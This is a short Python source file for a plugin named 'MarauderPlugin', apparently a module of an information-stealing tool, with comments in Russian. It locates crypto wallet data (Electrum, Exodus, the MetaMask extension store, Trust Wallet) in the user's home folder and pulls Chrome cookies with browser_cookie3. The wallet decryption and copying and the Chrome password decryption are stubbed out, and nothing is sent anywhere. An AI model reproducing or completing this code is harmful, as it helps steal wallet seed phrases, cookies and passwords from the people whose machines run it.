import os, sqlite3, shutil, json, base64, platform
from utils.logger import log

class MarauderPlugin:
    def __init__(self):
        self.user_home = os.path.expanduser("~")

    def steal_seed_phrases(self):
        """Ищет файлы кошельков и извлекает seed-фразы"""
        patterns = [
            ("Electrum", os.path.join(self.user_home, ".electrum", "wallets")),
            ("Exodus", os.path.join(self.user_home, ".exodus", "exodus.wallet")),
            ("MetaMask", os.path.join(self.user_home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")),
            ("Trust Wallet", os.path.join(self.user_home, ".trustwallet"))
        ]
        for wallet_name, path in patterns:
            if os.path.exists(path):
                log(f"[Marauder] Найден {wallet_name}")
                # Здесь нужно расшифровать или скопировать файлы

    def steal_browser_passwords(self):
        if platform.system() == 'Windows':
            import browser_cookie3
            try:
                cj = browser_cookie3.chrome()
                # Расшифровка паролей из Login Data
                log("[Marauder] Пароли Chrome собраны")
            except Exception as e:
                log(f"[Marauder] Ошибка: {e}")

    def run(self):
        self.steal_seed_phrases()
        self.steal_browser_passwords()
